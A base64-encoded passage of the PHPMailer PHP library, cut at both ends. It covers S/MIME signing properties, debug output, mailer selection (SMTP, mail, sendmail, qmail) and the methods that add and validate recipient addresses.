YWdlcy4KICAgICAqIEB2YXIgYXJyYXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFuZ3VhZ2UgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogVGhlIG51bWJlciBvZiBlcnJvcnMgZW5jb3VudGVyZWQuCiAgICAgKiBAdmFyIGludGVnZXIKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBjZXJ0aWZpY2F0ZSBmaWxlIHBhdGguCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBrZXkgZmlsZSBwYXRoLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIG9wdGlvbmFsIFMvTUlNRSBleHRyYSBjZXJ0aWZpY2F0ZXMgKCJDQSBDaGFpbiIpIGZpbGUgcGF0aC4KICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIHBhc3N3b3JkIGZvciB0aGUga2V5LgogICAgICogVXNlZCBvbmx5IGlmIHRoZSBrZXkgaXMgZW5jcnlwdGVkLgogICAgICogQHZhciBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfcGFzcyA9ICcnOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byB0aHJvdyBleGNlcHRpb25zIGZvciBlcnJvcnMuCiAgICAgKiBAdmFyIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXhjZXB0aW9ucyA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVW5pcXVlIElEIHVzZWQgZm9yIG1lc3NhZ2UgSUQgYW5kIGJvdW5kYXJpZXMuCiAgICAgKiBAdmFyIHN0cmluZwogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqLwogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOwoKICAgIC8qKgogICAgICogRXJyb3Igc2V2ZXJpdHk6IG1lc3NhZ2Ugb25seSwgY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9NRVNTQUdFID0gMDsKCiAgICAvKioKICAgICAqIEVycm9yIHNldmVyaXR5OiBtZXNzYWdlLCBsaWtlbHkgb2sgdG8gY29udGludWUgcHJvY2Vzc2luZy4KICAgICAqLwogICAgY29uc3QgU1RPUF9DT05USU5VRSA9IDE7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSwgcGx1cyBmdWxsIHN0b3AsIGNyaXRpY2FsIGVycm9yIHJlYWNoZWQuCiAgICAgKi8KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOwoKICAgIC8qKgogICAgICogU01UUCBSRkMgc3RhbmRhcmQgbGluZSBlbmRpbmcuCiAgICAgKi8KICAgIGNvbnN0IENSTEYgPSAiXHJcbiI7CgogICAgLyoqCiAgICAgKiBUaGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkIGJ5IFJGQyAyODIyIHNlY3Rpb24gMi4xLjEKICAgICAqIEB2YXIgaW50ZWdlcgogICAgICovCiAgICBjb25zdCBNQVhfTElORV9MRU5HVEggPSA5OTg7CgogICAgLyoqCiAgICAgKiBDb25zdHJ1Y3Rvci4KICAgICAqIEBwYXJhbSBib29sZWFuICRleGNlcHRpb25zIFNob3VsZCB3ZSB0aHJvdyBleHRlcm5hbCBleGNlcHRpb25zPwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGV4Y2VwdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmICgkZXhjZXB0aW9ucyAhPT0gbnVsbCkgewogICAgICAgICAgICAkdGhpcy0+ZXhjZXB0aW9ucyA9IChib29sZWFuKSRleGNlcHRpb25zOwogICAgICAgIH0KICAgICAgICAvL1BpY2sgYW4gYXBwcm9wcmlhdGUgZGVidWcgb3V0cHV0IGZvcm1hdCBhdXRvbWF0aWNhbGx5CiAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0ID0gKHN0cnBvcyhQSFBfU0FQSSwgJ2NsaScpICE9PSBmYWxzZSA/ICdlY2hvJyA6ICdodG1sJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBEZXN0cnVjdG9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCiAgICB7CiAgICAgICAgLy9DbG9zZSBhbnkgb3BlbiBTTVRQIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2FsbCBtYWlsKCkgaW4gYSBzYWZlX21vZGUtYXdhcmUgZmFzaGlvbi4KICAgICAqIEFsc28sIHVubGVzcyBzZW5kbWFpbF9wYXRoIHBvaW50cyB0byBzZW5kbWFpbCAob3Igc29tZXRoaW5nIHRoYXQKICAgICAqIGNsYWltcyB0byBiZSBzZW5kbWFpbCksIGRvbid0IHBhc3MgcGFyYW1zIChub3QgYSBwZXJmZWN0IGZpeCwKICAgICAqIGJ1dCBpdCB3aWxsIGRvKQogICAgICogQHBhcmFtIHN0cmluZyAkdG8gVG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QgU3ViamVjdAogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBNZXNzYWdlIEJvZHkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBBZGRpdGlvbmFsIEhlYWRlcihzKQogICAgICogQHBhcmFtIHN0cmluZyAkcGFyYW1zIFBhcmFtcwogICAgICogQGFjY2VzcyBwcml2YXRlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBtYWlsUGFzc3RocnUoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpCiAgICB7CiAgICAgICAgLy9DaGVjayBvdmVybG9hZGluZyBvZiBtYWlsIGZ1bmN0aW9uIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZwogICAgICAgIGlmIChpbmlfZ2V0KCdtYnN0cmluZy5mdW5jX292ZXJsb2FkJykgJiAxKSB7CiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHN1YmplY3QpKTsKICAgICAgICB9CgogICAgICAgIC8vQ2FuJ3QgdXNlIGFkZGl0aW9uYWxfcGFyYW1ldGVycyBpbiBzYWZlX21vZGUsIGNhbGxpbmcgbWFpbCgpIHdpdGggbnVsbCBwYXJhbXMgYnJlYWtzCiAgICAgICAgLy9AbGluayBodHRwOi8vcGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWFpbC5waHAKICAgICAgICBpZiAoaW5pX2dldCgnc2FmZV9tb2RlJykgb3IgISR0aGlzLT5Vc2VTZW5kbWFpbE9wdGlvbnMgb3IgaXNfbnVsbCgkcGFyYW1zKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQogICAgLyoqCiAgICAgKiBPdXRwdXQgZGVidWdnaW5nIGluZm8gdmlhIHVzZXItZGVmaW5lZCBtZXRob2QuCiAgICAgKiBPbmx5IGdlbmVyYXRlcyBvdXRwdXQgaWYgU01UUCBkZWJ1ZyBvdXRwdXQgaXMgZW5hYmxlZCAoQHNlZSBTTVRQOjokZG9fZGVidWcpLgogICAgICogQHNlZSBQSFBNYWlsZXI6OiREZWJ1Z291dHB1dAogICAgICogQHNlZSBQSFBNYWlsZXI6OiRTTVRQRGVidWcKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5TTVRQRGVidWcgPD0gMCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vQXZvaWQgY2xhc2ggd2l0aCBidWlsdC1pbiBmdW5jdGlvbiBuYW1lcwogICAgICAgIGlmICghaW5fYXJyYXkoJHRoaXMtPkRlYnVnb3V0cHV0LCBhcnJheSgnZXJyb3JfbG9nJywgJ2h0bWwnLCAnZWNobycpKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgewogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgICAgICAgICAvL0Rvbid0IG91dHB1dCwganVzdCBsb2cKICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdodG1sJzoKICAgICAgICAgICAgICAgIC8vQ2xlYW5zIHVwIG91dHB1dCBhIGJpdCBmb3IgYSBiZXR0ZXIgbG9va2luZywgSFRNTC1zYWZlIG91dHB1dAogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMoCiAgICAgICAgICAgICAgICAgICAgcHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJHN0ciksCiAgICAgICAgICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgICAgICAgICAnVVRGLTgnCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAuICI8YnI+XG4iOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2VjaG8nOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9Ob3JtYWxpemUgbGluZSBicmVha3MKICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy9cclxuPy9tcycsICJcbiIsICRzdHIpOwogICAgICAgICAgICAgICAgZWNobyBnbWRhdGUoJ1ktbS1kIEg6aTpzJykgLiAiXHQiIC4gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgIlxuIiwKICAgICAgICAgICAgICAgICAgICAiXG4gICAgICAgICAgICAgICAgICAgXHQgICAgICAgICAgICAgICAgICAiLAogICAgICAgICAgICAgICAgICAgIHRyaW0oJHN0cikKICAgICAgICAgICAgICAgICkgLiAiXG4iOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgU01UUC4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTTVRQKCkKICAgIHsKICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3NtdHAnOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBQSFAncyBtYWlsKCkgZnVuY3Rpb24uCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzTWFpbCgpCiAgICB7CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdtYWlsJzsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgJFNlbmRtYWlsLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1NlbmRtYWlsKCkKICAgIHsKICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7CgogICAgICAgIGlmICghc3RyaXN0cigkaW5pX3NlbmRtYWlsX3BhdGgsICdzZW5kbWFpbCcpKSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICRpbmlfc2VuZG1haWxfcGF0aDsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1lc3NhZ2VzIHVzaW5nIHFtYWlsLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1FtYWlsKCkKICAgIHsKICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7CgogICAgICAgIGlmICghc3RyaXN0cigkaW5pX3NlbmRtYWlsX3BhdGgsICdxbWFpbCcpKSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdmFyL3FtYWlsL2Jpbi9xbWFpbC1pbmplY3QnOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICRpbmlfc2VuZG1haWxfcGF0aDsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdxbWFpbCc7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSAiVG8iIGFkZHJlc3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEFkZHJlc3MoJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ3RvJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJDQyIgYWRkcmVzcy4KICAgICAqIEBub3RlOiBUaGlzIGZ1bmN0aW9uIHdvcmtzIHdpdGggdGhlIFNNVFAgbWFpbGVyIG9uIHdpbjMyLCBub3Qgd2l0aCB0aGUgIm1haWwiIG1haWxlci4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHJldHVybiBib29sZWFuIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ0MoJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ2NjJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJCQ0MiIGFkZHJlc3MuCiAgICAgKiBAbm90ZTogVGhpcyBmdW5jdGlvbiB3b3JrcyB3aXRoIHRoZSBTTVRQIG1haWxlciBvbiB3aW4zMiwgbm90IHdpdGggdGhlICJtYWlsIiBtYWlsZXIuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEJDQygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnYmNjJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhICJSZXBseS1UbyIgYWRkcmVzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFJlcGx5VG8oJGFkZHJlc3MsICRuYW1lID0gJycpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ1JlcGx5LVRvJywgJGFkZHJlc3MsICRuYW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhZGRyZXNzIHRvIG9uZSBvZiB0aGUgcmVjaXBpZW50IGFycmF5cyBvciB0byB0aGUgUmVwbHlUbyBhcnJheS4gQmVjYXVzZSBQSFBNYWlsZXIKICAgICAqIGNhbid0IHZhbGlkYXRlIGFkZHJlc3NlcyB3aXRoIGFuIElETiB3aXRob3V0IGtub3dpbmcgdGhlIFBIUE1haWxlcjo6JENoYXJTZXQgKHRoYXQgY2FuIHN0aWxsCiAgICAgKiBiZSBtb2RpZmllZCBhZnRlciBjYWxsaW5nIHRoaXMgZnVuY3Rpb24pLCBhZGRpdGlvbiBvZiBzdWNoIGFkZHJlc3NlcyBpcyBkZWxheWVkIHVudGlsIHNlbmQoKS4KICAgICAqIEFkZHJlc3NlcyB0aGF0IGhhdmUgYmVlbiBhZGRlZCBhbHJlYWR5IHJldHVybiBmYWxzZSwgYnV0IGRvIG5vdCB0aHJvdyBleGNlcHRpb25zLgogICAgICogQHBhcmFtIHN0cmluZyAka2luZCBPbmUgb2YgJ3RvJywgJ2NjJywgJ2JjYycsIG9yICdSZXBseVRvJwogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kLCByZXNwLiB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbiB0cnVlIG9uIHN1Y2Nlc3MsIGZhbHNlIGlmIGFkZHJlc3MgYWxyZWFkeSB1c2VkIG9yIGludmFsaWQgaW4gc29tZSB3YXkKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRPckVucXVldWVBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSkKICAgIHsKICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOwogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQogICAgICAgIGlmICgoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSkgewogICAgICAgICAgICAvLyBBdC1zaWduIGlzIG1pc3NzaW5nLgogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKGFkZEFuQWRkcmVzcyAka2luZCk6ICRhZGRyZXNzIjsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkcGFyYW1zID0gYXJyYXkoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSk7CiAgICAgICAgLy8gRW5xdWV1ZSBhZGRyZXNzZXMgd2l0aCBJRE4gdW50aWwgd2Uga25vdyB0aGUgUEhQTWFpbGVyOjokQ2hhclNldC4KICAgICAgICBpZiAoJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIGFuZCAkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIHsKICAgICAgICAgICAgaWYgKCRraW5kICE9ICdSZXBseS1UbycpIHsKICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZXBseVRvUXVldWUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOwogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgLy8gSW1tZWRpYXRlbHkgYWRkIHN0YW5kYXJkIGFkZHJlc3NlcyB3aXRob3V0IElETi4KICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJHRoaXMsICdhZGRBbkFkZHJlc3MnKSwgJHBhcmFtcyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gYWRkcmVzcyB0byBvbmUgb2YgdGhlIHJlY2lwaWVudCBhcnJheXMgb3IgdG8gdGhlIFJlcGx5VG8gYXJyYXkuCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgT25lIG9mICd0bycsICdjYycsICdiY2MnLCBvciAnUmVwbHlUbycKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCwgcmVzcC4gdG8gcmVwbHkgdG8KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICBpZiAoIWluX2FycmF5KCRraW5kLCBhcnJheSgndG8nLCAnY2MnLCAnYmNjJywgJ1JlcGx5LVRvJykpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ0ludmFsaWQgcmVjaXBpZW50IGtpbmQ6ICcpIC4gJGtpbmQ7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgewogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKGFkZEFuQWRkcmVzcyAka2luZCk6ICRhZGRyZXNzIjsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgewogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5hbGxfcmVjaXBpZW50cykpIHsKICAgICAgICAgICAgICAgIGFycmF5X3B1c2goJHRoaXMtPiRraW5kLCBhcnJheSgkYWRkcmVzcywgJG5hbWUpKTsKICAgICAgICAgICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSB0cnVlOwogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5SZXBseVRvKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9bc3RydG9sb3dlcigkYWRkcmVzcyldID0gYXJyYXkoJGFkZHJlc3MsICRuYW1lKTsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIFBhcnNlIGFuZCB2YWxpZGF0ZSBhIHN0cmluZyBjb250YWluaW5nIG9uZSBvciBtb3JlIFJGQzgyMi1zdHlsZSBjb21tYS1zZXBhcmF0ZWQgZW1haWwgYWRkcmVzc2VzCiAgICAgKiBvZiB0aGUgZm9ybSAiZGlzcGxheSBuYW1lIDxhZGRyZXNzPiIgaW50byBhbiBhcnJheSBvZiBuYW1lL2FkZHJlc3MgcGFpcnMuCiAgICAgKiBVc2VzIHRoZSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0IGZ1bmN0aW9uIGlmIHRoZSBJTUFQIGV4dGVuc2lvbiBpcyBhdmFpbGFibGUuCiAgICAgKiBOb3RlIHRoYXQgcXVvdGVzIGluIHRoZSBuYW1lIHBhcnQgYXJlIHJlbW92ZWQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyc3RyIFRoZSBhZGRyZXNzIGxpc3Qgc3RyaW5nCiAgICAgKiBAcGFyYW0gYm9vbCAkdXNlaW1hcCBXaGV0aGVyIHRvIHVzZSB0aGUgSU1BUCBleHRlbnNpb24gdG8gcGFyc2UgdGhlIGxpc3QKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAq